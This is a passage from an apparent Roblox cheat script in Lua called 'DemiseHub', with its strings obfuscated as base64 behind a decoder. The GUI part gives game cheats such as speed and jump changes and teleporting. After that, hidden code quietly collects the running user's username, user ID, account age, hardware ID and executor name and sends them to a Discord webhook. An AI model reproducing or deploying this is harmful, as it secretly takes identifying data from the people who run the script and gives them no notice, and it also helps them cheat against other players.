    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('VLWPJWgeSrFDIvOjnZDlixIqvuHRKdsdPuqcbyxwlFzWxXRZlabjjIYSGVhZGxlc3M='); 
    Callback = function() 
        game.Players.LocalPlayer.Character.Head.Transparency = 1
    end
})

Misc:CreateButton({
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('HHtFNXaApIUmRJoMRLfBEUlwwYEgwxrVvznFmMgmvPiYasiYLExQrqsUmVtb3ZlIFRleHR1cmVz'); 
    Callback = function() 
        for _, v in next, workspace:GetDescendants() do
            if v.ClassName == IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('fzdvDOazZRooPWCnGJjdAKISkDpOKTBOGjxFOQJQPgkRLANDkNYBEWmRGVjYWw=') then
                v:Destroy()
            end
        end
    end
})

Misc:CreateSlider({ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('zAjWgYyHqmQyGuQcrEDItTebGPfWquuQdrOLSAcvVZCjkUngejxGEYUV2Fsa1NwZWVk'); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('urHCzxyYCXEnJQhgupzTPAnQPNulafureToxJwWVLtRukbOoPbjZBjzd3M='); 
    Min = 16; 
    Max = 250; 
    AllowOutOfRange = true;
    Digits = 2;
    Default = 16; 
    Callback = function(v)
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v
    end;
})

Misc:CreateSlider({ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('AGNzsYOxAZEHeODavXsPxOdLFTsjwDugaLDDbvnFjsdHwmVxldnzbLeSnVtcFBvd2Vy'); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('EFXFIxuMhgnMtSOTYYVNxroEEupYRCXrScjYTKEpLBRZVPPtkSyzvppanA='); 
    Min = 50; 
    Max = 250; 
    AllowOutOfRange = true;
    Digits = 2;
    Default = 50; 
    Callback = function(v)
        game.Players.LocalPlayer.Character.Humanoid.JumpHeight = v
    end;
})

Misc:CreateSlider({ 
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('yFBITgfWGfBcjHXykjBJLOSzVGMfEgBYNdwBXKqYSRFfOqlKjVbArDJRk9W'); 
    Flag = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('uQlOlSLqHYqsNTFAMiyBabDdRbDDglaXLtNxirxDVLmAuhXGkpQcQMiRk9W'); 
    Min = 70; 
    Max = 120; 
    AllowOutOfRange = true;
    Digits = 2;
    Default = 70; 
    Callback = function(v)
        game.Workspace.CurrentCamera.FieldOfView = v
    end;
})

AutoFarm:CreateButton({
    Name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('QOQgqBNOPRBRFOzNJypCVMbVcogAVRwhturYymTWwCdHikFKcDcXimZRml4IENoYXJhY3Rlcg=='); 
    Callback = function() 
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0,5,0)
    end
})
end

local webh = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('uMmXMnTSfiykzomsPACSkbMeLdTDbjJkkYzZCOwlPfvebOwcdXZnUJHaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTAzMzQ4MzE2Mzk5MDc2OTcyNS9RbVROQWdKZTE0MDdfVl9HaTRWbmc5TW1TMzNWWXRUSXJONDVJUDRLYWN5ejd4bllzaDByU2E1NEdVWEc3UkZ0UnY4Tg==')


pcall(function()
   local data = {

  [IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('UerDFbYArjeiqaFqxAlBYOFdOedlaxzKuTInNPKjVOSDYvTRUbxteQRZW1iZWRz')] = {
    {
       [IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('DHHmQrtaLJZNACYTrsTHKHySEuiDDbazGTMrZHDDwJWrncHpXhzyYSodGl0bGU=')] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('LkuSoolOVPVMTjOGExvrjMBfHoIvVCwDzBzpVZVywEcdbHDkKVAFIfLYGBTb21lb25lIEV4ZWN1dGVkIEEgRGVtaXNlSHViIFNjcmlwdGBg'),
       [IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('YuzYcwrCeLNzdurCEiaFyoHwcRzyoMXJaUUalTuHPynFEACOtOKgAkbZGVzY3JpcHRpb24=')] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('pbNvUqsYihJePYAWcJGhBNUNOslsDqgVqsuHCmxCIxuZloKlknxAsVfKipEZW1pc2VIdWIgSGFzIEJlZW4gRXhjdXRlZCoq'),
       [IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('YsLyBJSDcItCpUOXvFWmSzGlhkuXTSMSTsQuFfveQpzriAuJsBMWKjddHlwZQ==')] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('LvtSsLcbuwRhQVyDMpEgopxIFSjBsFAdUtLAXReonIoYyzEDOsSBTjLcmljaA=='),
       [IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('SLZNYxMoTOTCuGrVBtsqBlcSmCpZqfbXJbHITtvuSyNCTNbTWeGBqQIY29sb3I=')] = tonumber(16753920),
       [IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('lOMFbkYScvScNVmiqBbyTaGEqZsjhRQYydMHSlvgyccKVYUqpjuaSnUZmllbGRz')] = {
          {name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('xIEwHmWAEKUKddzcVMPwUUmHRePdRSrIBFPpQetKhaXkjgUtUbAvSAuKipVc2VybmFtZSoq'), value = game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('OYkjHdZQwmZJgaAUcQKLzqQPunlcpkssminDaeOweUuzVcpCLtETPNZUGxheWVycw==')).LocalPlayer.Name},
          {name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('jnEiXOiPIwVihTMjDMoLiPQWKFZTJJWIYThSVoCkvXAsUXWsTsTuNRuKipEaXNwbGF5IE5hbWUqKg=='), value = game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ymIgOYiXOrrUWXKcNcflksLoBMybYUTVJKFjsAcELkbkaDAMhaNpFcHUGxheWVycw==')).LocalPlayer.DisplayName},
          {name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('cWhzGujpVRPNNFAequtKeSAoCDlAMIvGtJexJmVAYLxiwtVrqQyXsqGKipQbGF5ZXIgSUQqKg=='), value = game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('DYUKPFpZSfurFOISjQjtdkGCgLkyheRtTuNhvXgAjKKuopbjUzrwRHEUGxheWVycw==')).LocalPlayer.UserId},
          {name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('VebxTFAVygqbWvRTOfSFoYAJcJhXaUnkNSFBETJOoQUCNiReNqpCfEJKipQbGF5ZXIgQWNjb3VudCBBZ2UqKg=='), value = game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('JqmvsybGoHvyNAphaDgCSDHroAdnZVXrMOFZwuImTwiPPYeSkFrjbwLUGxheWVycw==')).LocalPlayer.AccountAge},
          {name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('mjKpSOBvTkWRzukRAfMWTVdzAAwwuCFWLRLtlolmEXYTbFdBBhbeEunKipIYXJkd2FyZSBJRCoq'), value = game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('ScfROsZVngwUIDeQOgwHOfNwvsnfJdnNqOIKCQwBVSsQCnQWFtDPvtxUmJ4QW5hbHl0aWNzU2VydmljZQ==')):GetClientId()},
          {name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('SIwdkknTFgfpEdIlEyhQJDIsshpELbQGRjnnYsBUlhpAzWTTTyLuOxxKipQaW5nKio='), value = game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('SYDuYUUyVYJFUNgoKzbGwdwbSiTWcSoHkxiupXanFkaNYjQvhpnBifDU3RhdHM=')).Network.ServerStatsItem[IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('dBMIjVaQQDdNOfdAaKFByYyygCaZOPBsfwBIiZCXLGdJeYIDShgxwMoRGF0YSBQaW5n')]:GetValueString()},
          {name = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('pqdwPuuGeouJwtqWAasxwWVxHYjhvFZBiaDVfHYgjCocFoNBKBZrMHyKipFeGVjdXRvcioq'), value = identifyexecutor()},
        }
    }
  }
}

   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('XXKUvGeAAusoQuhYWSwvNfiGtMqrdwSznfNDNwMWTrrYOIaSuQJRVTbUE9TVA=='),
               Headers = {
                   [IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('uwXoyxZazWQWWzOfgIpJlAlWucdqFUGkGCgLmixkojqUEaOerVlOxTkQ29udGVudC1UeXBl')] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('jnbvEwZkYdDJSkewcpdZkOUaMCGStXyuoZbROdyQGUfSUSIbRctqjobYXBwbGljYXRpb24vanNvbg==')
               },
               Body = game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('PyCOzBOXPEZVSiLteQlxOCGdamqGvCHTHOKjOpKaOXFMvqLdMswSLnESHR0cFNlcnZpY2U=')):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('aMVvRMFwsdNgHeUWtGWOuRTFfOiJbhlmCQqcHORnjYTDXEJbhqvrNqfUE9TVA=='),
               Headers = {
                   [IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('KPVPXUJORdchrgqfHLvJpDqBTylgzdrJcdtrkgaWeyNxYeejAwcjKdmQ29udGVudC1UeXBl')] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('HxVBgbUbTzmpYNQBHKdehFbFrogJjMHwEXehnUukBGbImFTrJNLzSPbYXBwbGljYXRpb24vanNvbg==')
               },
               Body = game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('AlImHgltylLTIWyGcDDakSWdtiTSurMpkYEFMynHnLQTnfJjYQBSECMSHR0cFNlcnZpY2U=')):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('qQradABpzGNgYLJMvoNjOCPEZeVOVwinDYozFBQCMNagnXCbCRWAXgDUE9TVA=='),
               Headers = {
                   [IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('HlFlWixFfTKcBqOPaSBfiGLrXBIDbNgKmUOOAyBXPpglIPbjJTYzLdzQ29udGVudC1UeXBl')] = IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('UJgBQVIdsMboEHWQNsuwFYrkqwliIFhWITBvaVMzyuhLnwznmibYRylYXBwbGljYXRpb24vanNvbg==')
               },
               Body = game:GetService(IPNTQZJgnDtUoQMoIYvfJkGgAHctpnltNHbHzrexMwPoZHvbdquxmoOigGiK('KYGsSlSICeMiMEBoIbGXoLjZLCzRNeYBVNihxUOfLlSMdLnMCTtpbqqSHR0cFNlcnZpY2U=')):JSONEncode(data)
           }
       );
   end
end)    
